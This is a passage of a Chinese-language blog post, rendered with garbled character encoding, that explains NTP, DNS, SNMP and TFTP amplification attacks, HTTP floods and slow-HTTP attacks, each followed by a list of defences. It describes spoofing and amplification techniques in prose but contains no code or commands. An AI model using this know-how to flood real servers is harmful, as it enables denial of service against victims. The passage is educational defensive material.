ä¸ºå—å®³ä¸»æœºçš„IPï¼Œå‘NTPæœåŠ¡å™¨å‘é€ä¸€ä¸ªmonlistæŸ¥è¯¢è¯·æ±‚åŒ…ï¼Œå—å®³ä¸»æœºå°±ä¼šæ”¶åˆ°å¤§é‡çš„UDPå“åº”åŒ…ã€‚è¿™ç§æ”»å‡»åœ¨æ”¾å¤§æ”»å‡»é‡Œï¼Œå±å®³ç›¸å¯¹è¾ƒå¤§ã€‚</p>
<p>æ€»ç»“ä¸€ä¸‹è¿™ç§æ”»å‡»äº§ç”Ÿçš„åŸå› :</p>
<ul>
<li>è¯·æ±‚ä¸å“åº”æ•°æ®åŒ…ä¸ç­‰ä»·ï¼›</li>
<li>UDPåè®®çš„é€šä¿¡æ¨¡ç³Šæ€§ï¼ˆæ— æ•°æ®ä¼ è¾“ç¡®è®¤æœºåˆ¶ï¼‰ï¼›</li>
<li>NTPæœåŠ¡å™¨çš„æ— è®¤è¯æœºåˆ¶ã€‚</li>
</ul>
<p>å†æ¥è°ˆè°ˆ<strong>é˜²å¾¡æ–¹æ¡ˆ</strong>ï¼š</p>
<ul>
<li>ä½¿ç”¨é˜² <code>DDoS</code> è®¾å¤‡è¿›è¡Œæ¸…æ´—ï¼›</li>
<li>åŠ å›ºå¹¶å‡çº§NTPæœåŠ¡å™¨ï¼›</li>
<li>åœ¨ç½‘ç»œå‡ºå£å°ç¦ <code>UDP 123</code> æ—¶é—´åŒæ­¥ç«¯å£ï¼›</li>
<li>é€šè¿‡ç½‘ç»œå±‚æˆ–è€…å€ŸåŠ©è¿è¥å•†å®æ–½ <code>ACL</code> æ¥é˜²å¾¡ï¼›</li>
<li>å…³é—­ç°åœ¨ <code>NTP</code> æœåŠ¡çš„ <code>monlist</code> åŠŸèƒ½ï¼Œåœ¨ <code>ntp.conf</code>é…ç½®æ–‡ä»¶ä¸­å¢åŠ <code>disable monitor</code> é€‰é¡¹ã€‚</li>
</ul>
<hr>
<h2 id="DNSæ”¾å¤§æ”»å‡»"><a href="#DNSæ”¾å¤§æ”»å‡»" class="headerlink" title="DNSæ”¾å¤§æ”»å‡»"></a>DNSæ”¾å¤§æ”»å‡»</h2><p>DNS(Domain Name Systemï¼ŒåŸŸåç³»ç»Ÿ)ï¼Œç”±äºä½¿ç”¨IPåœ°å€æ¥è®°å¿†å„ä¸ªç½‘ç«™æ¯”è¾ƒå›°éš¾ï¼Œæ‰€ä»¥å°±äº§ç”Ÿäº†ä½¿ç”¨ä¸»æœºåç§°æ¥è¡¨ç¤ºå¯¹åº”çš„æœåŠ¡å™¨ï¼Œä¸»æœºåç§°é€šè¿‡åŸŸåè§£æçš„è¿‡ç¨‹è½¬æ¢æˆIPåœ°å€ã€‚ä¸‹é¢æ¥çœ‹ä¸€ä¸‹DNSæŠ¥æ–‡æ ¼å¼ï¼Œä»¥ä¾¿äº†è§£æ”»å‡»å‘ç”Ÿåœ¨ä½•å¤„ã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_9.png" data-fancybox="group" data-caption="ddos_9" class="fancybox"><img alt="ddos_9" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_9.png" class="lazyload" title="ddos_9"></a></p>
<p><strong>æŠ¥æ–‡é¦–éƒ¨æ ¼å¼</strong></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_10.png" data-fancybox="group" data-caption="ddos_10" class="fancybox"><img alt="ddos_10" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_10.png" class="lazyload" title="ddos_10"></a></p>
<p>æŠ¥æ–‡é¦–éƒ¨å„å­—æ®µå«ä¹‰å¦‚ä¸‹ï¼Œå…¶ä¸­é«˜äº®æ˜¯æ”»å‡»ç‚¹ä¹‹ä¸€</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_11.png" data-fancybox="group" data-caption="ddos_11" class="fancybox"><img alt="ddos_11" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_11.png" class="lazyload" title="ddos_11"></a></p>
<p>ä¸‹é¢æ˜¯é—®é¢˜è®°å½•ä¸­æŸ¥è¯¢ç±»å‹å¯è®¾ç½®çš„å€¼ï¼Œå‘ç°æœ€åä¸€ä¸ªANYç±»å‹ä¼šè¯·æ±‚æ‰€æœ‰è®°å½•ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªæ”»å‡»ç‚¹</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_12.png" data-fancybox="group" data-caption="ddos_12" class="fancybox"><img alt="ddos_12" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_12.png" class="lazyload" title="ddos_12"></a></p>
<h3 id="DNSé€’å½’æŸ¥è¯¢"><a href="#DNSé€’å½’æŸ¥è¯¢" class="headerlink" title="DNSé€’å½’æŸ¥è¯¢"></a>DNSé€’å½’æŸ¥è¯¢</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_13.png" data-fancybox="group" data-caption="ddos_13" class="fancybox"><img alt="ddos_13" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_13.png" class="lazyload" title="ddos_13"></a></p>
<h3 id="DNSé€’å½’æŸ¥è¯¢-1"><a href="#DNSé€’å½’æŸ¥è¯¢-1" class="headerlink" title="DNSé€’å½’æŸ¥è¯¢"></a>DNSé€’å½’æŸ¥è¯¢</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_14.png" data-fancybox="group" data-caption="ddos_14" class="fancybox"><img alt="ddos_14" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_14.png" class="lazyload" title="ddos_14"></a></p>
<p>ä»DNSæ•°æ®åŒ…ç»“æ„ä»¥åŠDNSé€’å½’æŸ¥è¯¢è¿‡ç¨‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¤§è‡´åˆ†æå‡ºæ”»å‡»åŸç†ã€‚<br>é¦–å…ˆï¼Œæ”»å‡»è€…å‘ <strong>åƒµå°¸ç½‘ç»œ</strong> å‘å‡ºæŒ‡ä»¤ï¼Œä½¿åƒµå°¸ç½‘ç»œä¸­çš„æ¯ä¸€å°ä¸»æœºå‡å‘å‡ºä¸€ä¸ª <strong>ä¼ªé€ æºåœ°å€çš„DNSæŸ¥è¯¢è¯·æ±‚åŒ…</strong>ï¼Œè¿™äº›<strong>è¯·æ±‚åŒ…æŸ¥è¯¢ç±»å‹è®¾ç½®ä¸ºANY</strong>ï¼Œå› ä¸ºè¿™ç§ç±»å‹ä¼šè¯·æ±‚æ‰€æœ‰çš„è®°å½•ï¼Œè¿™äº›è®°å½•ä¼šåœ¨è¿”å›çš„å“åº”åŒ…ä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ç§æ•°æ®åŒ…çš„å¤§å°è¾ƒå…¶ä»–ç±»å‹æ˜¯æœ€å¤§çš„ã€‚</p>
<p>æ¥ç€æŸ¥è¯¢ç±»å‹è®¾ä¸ºé€’å½’æŸ¥è¯¢ï¼Œä¸ºä»€ä¹ˆä¸æ˜¯è¿­ä»£æŸ¥è¯¢å‘¢ï¼Œä»”ç»†çœ‹ä¸¤ç§æŸ¥è¯¢çš„è¿‡ç¨‹å›¾å¯å‘ç°ï¼Œ<strong>å¦‚æœè¿­ä»£æŸ¥è¯¢ç¬¬ä¸€ä¸ªè¯·æ±‚çš„DNSæœåŠ¡å™¨æ²¡æœ‰æŸ¥è¯¢åˆ°ç»“æœ</strong>ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªè¯·æ±‚çš„æœåŠ¡å™¨ä¼šè¿”å›å¦ä¸€ä¸ªDNSæœåŠ¡å™¨IPï¼Œè®©è¯·æ±‚ä¸»æœºå‘è¿™ä¸ªIPå»ç»§ç»­æŸ¥è¯¢ï¼Œç„¶è€Œ <strong><font color="6495ED">æ”»å‡»è€…çš„æ•°æ®åŒ…æºåœ°å€æ˜¯ä¼ªé€ çš„ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šå‘èµ·ç¬¬äºŒæ¬¡æŸ¥è¯¢ï¼Œå› ä¸ºç¬¬ä¸€æ¬¡æŸ¥è¯¢æ ¹æœ¬å°±ä¸æ˜¯å®ƒå‘èµ·çš„</font></strong>;</p>
<p>è€Œ<strong>é€’å½’æŸ¥è¯¢</strong>å´æ˜¯åœ¨æŸ¥è¯¢åˆ°ç»“æœä¹‹åï¼Œæ‰è¿”å›ç»™æŸ¥è¯¢è¯·æ±‚å‘èµ·è€…ã€‚<br>åˆ©ç”¨è¿™ä¸¤ä¸ªç‰¹ç‚¹ï¼Œæ”»å‡»è€…å°±å¯ä»¥æˆåŠŸå‘èµ·DNSæ”¾å¤§æ”»å‡»ã€‚<br>è¿™ç§æ™®é€šçš„æŸ¥è¯¢è¯·æ±‚å¯ä»¥<strong>å°†æ”»å‡»æµé‡æ”¾å¤§2~10å€</strong>ï¼Œå¦‚æœæƒ³å¢å¤§æ”»å‡»å€æ•°ï¼Œå¯ä»¥ä½¿ç”¨ <code>RFC 2671</code> ä¸­å®šä¹‰çš„DNSæ‹“å±•æœºåˆ¶EDNS0ã€‚æœªä½¿ç”¨EDNS0æ—¶ï¼Œè‹¥å“åº”åŒ…å¤§å°å°äº512å­—èŠ‚ï¼Œå°±ä½¿ç”¨UDPå°è£…æ•°æ®ï¼›è‹¥å“åº”åŒ…å¤§å°è¶…è¿‡512å­—èŠ‚ï¼Œå°±ä½¿ç”¨TCPè¿æ¥æˆ–è€…æœåŠ¡å™¨æˆªæ–­å“åº”æŠ¥æ–‡ï¼Œä¸¢å¼ƒè¶…è¿‡512å­—èŠ‚çš„éƒ¨åˆ†ï¼Œå¹¶æŠŠTCä½ç½®1ã€‚è¿™ä¸¤ç§æ–¹å¼éƒ½ä¸åˆ©äºè¿›è¡ŒDNSæ”¾å¤§æ”»å‡»ã€‚ç„¶è€Œåœ¨å¼€å¯EDNS0æœºåˆ¶åï¼Œå¢åŠ äº† <code>OPT RR</code> å­—æ®µï¼Œè¿™ä¸¤ä¸ªå­—æ®µåŒ…å«äº†èƒ½å¤Ÿå¤„ç†çš„æœ€å¤§UDPæŠ¥æ–‡å¤§å°ä¿¡æ¯ï¼Œæ‰€ä»¥æ”»å‡»è€…å°†è¿™ä¸ªä¿¡æ¯è®¾ç½®çš„å¾ˆå¤§ï¼ŒæœåŠ¡å™¨å°±ä¼šæ ¹æ®è¿™ä¸ªä¿¡æ¯ç”Ÿæˆå“åº”æŠ¥æ–‡ã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_15.png" data-fancybox="group" data-caption="ddos_15" class="fancybox"><img alt="ddos_15" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_15.png" class="lazyload" title="ddos_15"></a></p>
<p><strong>é˜²å¾¡æ–¹æ¡ˆ</strong>ï¼š</p>
<ul>
<li>è”ç³» <code>ISP</code> æ¸…æ´—ä¸Šæ¸¸æµé‡ï¼›</li>
<li>DNSæœåŠ¡å™¨åªå¯¹å¯ä¿¡åŸŸå†…æä¾›æœåŠ¡ï¼Œé™åˆ¶å¯¹åŸŸå¤–ç”¨æˆ·æä¾›DNSè§£ææœåŠ¡ï¼›</li>
<li>å¯¹å•ä¸ªIPçš„æŸ¥è¯¢é€Ÿç‡åšé™åˆ¶ï¼›</li>
<li>æ‹¥æœ‰è¶³å¤Ÿçš„å¸¦å®½æ‰¿å—å°è§„æ¨¡æ”»å‡»ï¼›</li>
<li>å…³é—­DNSæœåŠ¡å™¨çš„é€’å½’æŸ¥è¯¢ï¼›</li>
<li>åˆ©ç”¨é˜²ç«å¢™ç­‰å¯¹ <code>ANY Request</code> è¿›è¡Œè¿‡æ»¤ã€‚</li>
</ul>
<hr>
<h2 id="SNMPæ”¾å¤§æ”»å‡»"><a href="#SNMPæ”¾å¤§æ”»å‡»" class="headerlink" title="SNMPæ”¾å¤§æ”»å‡»"></a>SNMPæ”¾å¤§æ”»å‡»</h2><p><code>SNMP</code> ( <code>Simple Network Management Protocol</code>ï¼Œç®€å•ç½‘ç»œç®¡ç†åè®®)ï¼Œæ˜¯ç›®å‰ç½‘ç»œä¸­åº”ç”¨æœ€ä¸ºå¹¿æ³›çš„ç½‘ç»œç®¡ç†åè®®ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªç®¡ç†æ¡†æ¶æ¥ç›‘æ§å’Œç»´å’Œäº’è”ç½‘è®¾å¤‡ï¼Œå®ƒä½¿ç”¨UDP161ç«¯å£è¿›è¡Œé€šä¿¡ã€‚<font color="6495ED">æ”»å‡»è€…å‘äº’è”ç½‘ä¸Šå¼€å¯SNMPæœåŠ¡çš„è®¾å¤‡å‘é€GetBulkè¯·æ±‚ï¼Œå¹¶ä½¿ç”¨é»˜è®¤é€šä¿¡å­—ç¬¦ä¸²ä½œä¸ºè®¤è¯å‡­æ®ã€‚</font>å¸¸è§çš„é»˜è®¤é€šä¿¡å­—ç¬¦ä¸²å¦‚<code>public</code>ã€<code>private</code> ä»¥åŠä¸€äº›å‚å•†é»˜è®¤çš„é€šä¿¡å­—ç¬¦ä¸²ã€‚<strong>GetBulkè¯·æ±‚</strong>æ˜¯åœ¨<strong>SNMPv2</strong>ä¸­æ·»åŠ çš„ï¼Œè¯¥è¯·æ±‚ä¼šè®©SNMPè®¾å¤‡å°½å¯èƒ½å¤šçš„è¿”å›æ•°æ®ï¼Œè¿™ä¹Ÿå°±æ˜¯SNMPæ”¾å¤§æ”»å‡»çš„åˆ©ç”¨ç‚¹ã€‚</p>
<h3 id="ä¸‹é¢æ¥çœ‹ä¸€ä¸‹SNMPçš„PDUæ ¼å¼"><a href="#ä¸‹é¢æ¥çœ‹ä¸€ä¸‹SNMPçš„PDUæ ¼å¼" class="headerlink" title="ä¸‹é¢æ¥çœ‹ä¸€ä¸‹SNMPçš„PDUæ ¼å¼"></a>ä¸‹é¢æ¥çœ‹ä¸€ä¸‹SNMPçš„PDUæ ¼å¼</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_16.png" data-fancybox="group" data-caption="ddos_16" class="fancybox"><img alt="ddos_16" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_16.png" class="lazyload" title="ddos_16"></a></p>
<p>æ”»å‡»è€…å…ˆå°†æºåœ°å€æ”¹æˆè¦æ”»å‡»çš„ç›®æ ‡IPï¼Œå†ä½¿ç”¨é»˜è®¤çš„é€šä¿¡å­—ç¬¦ä¸²ï¼Œå‘å¤§é‡SNMPè®¾å¤‡å‘å‡ºGetBulkè¯·æ±‚ï¼Œè®¾å¤‡æ”¶åˆ°GetBulkè¯·æ±‚æ•°æ®åŒ…åï¼Œä¼šå°†ä¸€å¤§æ®µçš„è®¾å¤‡æ£€ç´¢ä¿¡æ¯è¿”å›ç»™ç›®æ ‡ä¸»æœºï¼Œæœ€ç»ˆç›®æ ‡ä¸»æœºä¼šè¢«è¿™äº›SNMPè®¾å¤‡è¿”å›çš„æ•°æ®åŒ…æ·¹æ²¡ï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_17.png" data-fancybox="group" data-caption="ddos_17" class="fancybox"><img alt="ddos_17" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_17.png" class="lazyload" title="ddos_17"></a></p>
<p>é˜²æŠ¤æ–¹æ¡ˆï¼š</p>
<ul>
<li>ç¦æ­¢å·²å¼€å¯SNMPçš„è®¾å¤‡å“åº”GetBulkè¯·æ±‚ï¼Œé¿å…è‡ªå·±çš„è®¾å¤‡è¢«é»‘å®¢åˆ©ç”¨ï¼›</li>
<li>æ›´æ”¹é»˜è®¤çš„é€šä¿¡å­—ç¬¦ä¸²ï¼›</li>
<li>ä¿®æ”¹é»˜è®¤ç«¯å£161ï¼›</li>
<li>éšè—å¼€å¯SNMPè®¾å¤‡çš„å…¬ç½‘IP</li>
</ul>
<hr>
<h2 id="TFTPæ”¾å¤§æ”»å‡»"><a href="#TFTPæ”¾å¤§æ”»å‡»" class="headerlink" title="TFTPæ”¾å¤§æ”»å‡»"></a>TFTPæ”¾å¤§æ”»å‡»</h2><p><code>TFTP</code>ï¼ˆ<code>Trivial File Transfer Protocol</code>ï¼Œç®€å•æ–‡ä»¶ä¼ è¾“åè®®ï¼‰ï¼Œä½¿ç”¨<code>UDP 69ç«¯å£</code>è¿›è¡Œé€šä¿¡ï¼Œç”±äºTFTPä½¿ç”¨çš„æ˜¯ä¸å¯é çš„UDPåè®®ï¼Œæ‰€ä»¥ä»–ä¸èƒ½ç¡®ä¿å‘é€çš„ä»»ä½•æŠ¥æ–‡éƒ½èƒ½çœŸæ­£åˆ°è¾¾ç›®çš„åœ°ï¼Œå› æ­¤ä»–å¿…é¡»ä½¿ç”¨å®šæ—¶å™¨æ¥æ£€æµ‹å¹¶é‡ä¼ æŠ¥æ–‡ï¼Œä»¥ä¸‹æ˜¯TFTPä¼ è¾“æ–‡ä»¶è¿‡ç¨‹å›¾</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_18.png" data-fancybox="group" data-caption="ddos_18" class="fancybox"><img alt="ddos_18" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_18.png" class="lazyload" title="ddos_18"></a></p>
<h3 id="è¶…æ—¶é‡ä¼ æœºåˆ¶"><a href="#è¶…æ—¶é‡ä¼ æœºåˆ¶" class="headerlink" title="è¶…æ—¶é‡ä¼ æœºåˆ¶"></a>è¶…æ—¶é‡ä¼ æœºåˆ¶</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_19.png" data-fancybox="group" data-caption="ddos_19" class="fancybox"><img alt="ddos_19" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_19.png" class="lazyload" title="ddos_19"></a></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œ<strong>TFTPåè®®</strong> å°†æ•°æ®åˆ†æˆå¥½å¤šä¸ªæ•°æ®å—è¿›è¡Œä¼ è¾“ï¼Œæ¯ä¸ªæ•°æ®å—æœ€å¤§ä¸º <strong>512å­—èŠ‚</strong>ï¼Œå®¢æˆ·ç«¯åœ¨æ¥å—åˆ°æ•°æ®å—æ—¶ï¼Œéœ€è¦ç»™æœåŠ¡å™¨ç«¯è¿”å›ä¸€ä¸ªACKç¡®è®¤æŠ¥æ–‡ï¼Œç„¶åæ‰ä¼šç»§ç»­ä¼ è¾“ä¸‹ä¸€ä¸ªæŠ¥æ–‡ã€‚è‹¥æœåŠ¡å™¨æ²¡æœ‰æ”¶åˆ°å®¢æˆ·ç«¯å‘æ¥ACKæŠ¥æ–‡ï¼Œåˆ™åœ¨æ—¶é—´åˆ°è¾¾è¶…æ—¶è®¡æ•°å™¨æ—¶ï¼Œä¾¿ä¼šå¼€å¯é‡ä¼ æœºåˆ¶ï¼Œè¿™ä¹Ÿå°±æ˜¯æ”»å‡»åˆ©ç”¨ç‚¹ã€‚</p>
<p>æ”»å‡»è€…åˆ©ç”¨TFTPåè®®ä¸Šçš„ç¼ºé™·ï¼Œä¼ªé€ æºåœ°å€å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ï¼ŒæœåŠ¡å™¨å›å¤çš„ç¬¬1ä¸ªdataæ•°æ®åŒ…åæ— æ³•æ”¶åˆ°å®¢æˆ·ç«¯å‘é€çš„ACKã€‚æ­¤æ—¶TFTPå°±ä¼šåˆ©ç”¨ä»–çš„é‡ä¼ æœºåˆ¶ï¼Œå®šæ—¶é‡ä¼ ç¬¬1ä¸ªdataæ•°æ®åŒ…ï¼Œå½“æ”»å‡»è€…å‘å‡ºå¤§é‡çš„è¿™ç§è¯·æ±‚æ—¶ï¼ŒTFTPæ”¾å¤§æ”»å‡»ä¹Ÿå°±å‘ç”Ÿäº†ã€‚</p>
<h3 id="TFTP-æ”¾å¤§æ”»å‡»ç¤ºæ„å›¾"><a href="#TFTP-æ”¾å¤§æ”»å‡»ç¤ºæ„å›¾" class="headerlink" title="TFTP æ”¾å¤§æ”»å‡»ç¤ºæ„å›¾"></a>TFTP æ”¾å¤§æ”»å‡»ç¤ºæ„å›¾</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_20.png" data-fancybox="group" data-caption="ddos_20" class="fancybox"><img alt="ddos_20" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_20.png" class="lazyload" title="ddos_20"></a></p>
<p><strong>é˜²å¾¡æ–¹æ¡ˆ</strong>ï¼š</p>
<ul>
<li>ä¸å°†TFTPæœåŠ¡å™¨æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼›</li>
<li>å¯¹æµç»TFTPæœåŠ¡çš„æµé‡è¿›è¡Œå…¥ä¾µæ£€æµ‹ï¼›</li>
<li>å°†é‡ä¼ ï¼ˆæ•°æ®åŒ…ï¼‰ç‡è®¾ç½®ä¸º1ï¼›</li>
<li>åªä¸ºä¿¡ä»»åŸŸå†…çš„ä¸»æœºæä¾›æœåŠ¡ã€‚</li>
</ul>
<hr>
<h2 id="CC-æ”»å‡»-é‡ç‚¹"><a href="#CC-æ”»å‡»-é‡ç‚¹" class="headerlink" title="CC æ”»å‡» (é‡ç‚¹)"></a>CC æ”»å‡» (é‡ç‚¹)</h2><p><strong>CCæ”»å‡» (ChallengeCollapsar)</strong> åˆç§°ä½œ <code>HTTP æ³›æ´ªæ”»å‡»</code>ï¼Œå…¶åŸç†æ˜¯æ”»å‡»è€…æ§åˆ¶è‚‰é¸¡ã€åƒµå°¸ç½‘ç»œæˆ–ä½¿ç”¨ä»£ç†æœåŠ¡å™¨ï¼Œä¸åœåœ°å‘ç›®æ ‡çš„webæœåŠ¡å‘é€å¤§é‡åˆæ³•è¯·æ±‚ï¼Œä½¿å¾—æ­£å¸¸ç”¨æˆ·çš„webè¯·æ±‚å¤„ç†ç¼“æ…¢ç”šè‡³å¾—ä¸åˆ°å¤„ç†ï¼Œåˆ¶é€ å¤§é‡çš„åå°æ•°æ®åº“æŸ¥è¯¢åŠ¨ä½œï¼Œæ¶ˆè€—ç›®æ ‡CPUèµ„æºï¼Œæœ€ç»ˆå¯¼è‡´æœåŠ¡å™¨å®•æœºå´©æºƒã€‚</p>
<p>è¿™ç§æ”»å‡»æ–¹å¼ä¸éœ€è¦å¾ˆå¤§çš„å¸¦å®½ï¼Œä¸”æ— æ³•ä½¿ç”¨ä¼ªé€ IPåœ°å€è¿›è¡Œæ”»å‡»ï¼Œéœ€è¦çœŸå®çš„æœºå™¨ä¸webæœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼Œ<strong><font color="6495ED">å› ä¸ºHTTPåè®®æ˜¯å»ºç«‹åœ¨TCPåè®®ä¸Šï¼Œå¿…é¡»å…ˆè¿›è¡ŒTCPä¸‰æ¬¡æ¡æ‰‹æ‰èƒ½è¿›è¡ŒHTTPé€šä¿¡ã€‚å¦‚æœç›®æ ‡webæœåŠ¡å™¨æ”¯æŒHTTPSï¼Œé‚£ä¹ˆå‘èµ·çš„HTTPSæ³›æ´ªæ”»å‡»è¿˜èƒ½ç©¿é€ä¸€äº›é˜²æŠ¤è®¾å¤‡ã€‚</font></strong></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_21.png" data-fancybox="group" data-caption="ddos_20" class="fancybox"><img alt="ddos_20" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_21.png" class="lazyload" title="ddos_20"></a></p>
<p><strong>é˜²å¾¡æ–¹æ¡ˆ</strong>ï¼š</p>
<ul>
<li>å¿…è¦æ—¶å°†ç½‘é¡µåšæˆé™æ€ï¼Œå‡å°‘æ•°æ®åº“çš„ä½¿ç”¨ï¼›</li>
<li>é™åˆ¶è¿æ¥æ•°é‡ï¼›ä¿®æ”¹æœ€å¤§è¶…æ—¶æ—¶é—´ï¼›</li>
<li>è®©ç”¨æˆ·æ‰‹åŠ¨è¾“å…¥éªŒè¯ç ï¼›</li>
<li>åœ¨responseæŠ¥æ–‡ä¸­æ·»åŠ ç‰¹æ®Šå­—æ®µï¼ŒéªŒè¯IPåˆæ³•æ€§ï¼›</li>
<li>å±è”½é¢‘ç¹è®¿é—®æœåŠ¡å™¨çš„ä¸»æœºIPã€‚</li>
</ul>
<hr>
<h2 id="HTTP-æ…¢é€Ÿæ”»å‡»"><a href="#HTTP-æ…¢é€Ÿæ”»å‡»" class="headerlink" title="HTTP æ…¢é€Ÿæ”»å‡»"></a>HTTP æ…¢é€Ÿæ”»å‡»</h2><p><code>Slow HTTP Dos Attacks</code>ï¼ˆæ…¢é€ŸHTTPæ‹’ç»æœåŠ¡æ”»å‡»ï¼‰ï¼Œé»‘å®¢æ¨¡æ‹Ÿæ­£å¸¸ç”¨æˆ·å‘webæœåŠ¡å™¨å‘é€æ…¢é€Ÿhttpè¯·æ±‚ï¼Œç”±äºæ˜¯æ…¢é€Ÿçš„ï¼ŒæœåŠ¡å™¨ç«¯éœ€è¦ä¿æŒè¿æ¥èµ„æºï¼Œç›´åˆ°æ•°æ®ä¼ è¾“ç»“æŸæˆ–è¯·æ±‚ç»“æŸæ‰å¯é‡Šæ”¾è¿æ¥ã€‚å½“æœåŠ¡å™¨ç«¯å»ºç«‹äº†å¤§é‡è¿™æ ·çš„æ…¢é€Ÿè¿æ¥ï¼Œå°±ä¼šå¯¼è‡´æœåŠ¡å™¨æ‹’ç»æœåŠ¡ã€‚è¿™ç§æ”»å‡»å¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼Œ<strong><font color="6495ED">ä¸€ç±»æ˜¯å®¢æˆ·ç«¯å‘æ•°æ®ï¼Œå¦ä¸€ç±»æ˜¯å®¢æˆ·ç«¯è¯»å–æœåŠ¡å™¨å‘æ¥çš„æ•°æ®</font></strong>ã€‚HTTPæ…¢é€Ÿæ”»å‡»å¯¹åŸºäºçº¿ç¨‹å¤„ç†çš„webæœåŠ¡å™¨å½±å“æ˜¾è‘—ï¼Œå¦‚ <code>apacheã€dhttpd</code>ï¼Œè€Œå¯¹åŸºäºäº‹ä»¶å¤„ç†çš„webæœåŠ¡å™¨å½±å“ä¸å¤§ï¼Œå¦‚ <code>ngixã€lighttpdã€‚HTTP</code> æ…¢é€Ÿæ”»å‡»è¿˜å¯ä»¥ç»†åˆ†æˆä»¥ä¸‹å‡ ç§æ”»å‡»æ–¹å¼ã€‚</p>
<h3 id="Slow-Loris-Attack"><a href="#Slow-Loris-Attack" class="headerlink" title="Slow Loris Attack"></a>Slow Loris Attack</h3><p>HTTPåè®®è§„å®šè¯·æ±‚å¤´ä»¥ä¸€ä¸ªç©ºè¡Œç»“æŸï¼Œæ‰€ä»¥ <code>å®Œæ•´çš„httpè¯·æ±‚å¤´</code> ç»“å°¾æ˜¯ <code>\r\n\r\n</code>ã€‚<br>ç„¶è€Œä½¿ç”¨éæ­£å¸¸çš„ <code>\r\n</code> æ¥ç»“å°¾ï¼Œå°±ä¼šå¯¼è‡´æœåŠ¡ç«¯è®¤ä¸ºæˆ‘ä»¬çš„è¯·æ±‚å¤´è¿˜æ²¡ç»“æŸï¼Œç­‰å¾…æˆ‘ä»¬ç»§ç»­å‘é€æ•°æ®ç›´åˆ°è¶…æ—¶æ—¶é—´ã€‚</p>
<p>ä¸¤ç§è¯·æ±‚å¤´åŒºåˆ«å¦‚ä¸‹ï¼Œ<strong><font color="6495ED">CRLF</font>(Carriage Return Line Feed)</strong> è¡¨ç¤ºå›è½¦æ¢è¡Œ</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_22.png" data-fancybox="group" data-caption="ddos_22" class="fancybox"><img alt="ddos_22" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_22.png" class="lazyload" title="ddos_22"></a></p>
<h3 id="Slow-Post-Attack"><a href="#Slow-Post-Attack" class="headerlink" title="Slow Post Attack"></a>Slow Post Attack</h3><p>åœ¨httpå¤´éƒ¨ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨ <code>content-length</code> å£°æ˜HTTPæ¶ˆæ¯å®ä½“çš„ä¼ è¾“é•¿åº¦ï¼ŒæœåŠ¡å™¨ç«¯ä¼šå°† <code>content-length</code> çš„å€¼ä½œä¸º <code>HTTP BODY</code> çš„é•¿åº¦ã€‚(è¿™ä¸ªå¥½åƒStruts2 æœ‰ç±»ä¼¼çš„æ¼æ´)</p>
<p>åˆ©ç”¨è¿™ä¸€ç‰¹ç‚¹ï¼Œæ”»å‡»è€…æŠŠ <code>content-length</code> è®¾ç½®å¾—å¾ˆå¤§çš„ï¼Œç„¶åç¼“æ…¢å‘é€æ•°æ®éƒ¨åˆ†ï¼Œæ¯”å¦‚ä¸€æ¬¡åªå‘é€ä¸€ä¸ªå­—èŠ‚ï¼Œè¿™æ ·æœåŠ¡å™¨ç«¯å°±è¦ä¸€ç›´ä¿æŒè¿æ¥ï¼Œç›´åˆ°å®¢æˆ·ç«¯ä¼ å®Œæ‰€æœ‰çš„æ•°æ®ã€‚</p>
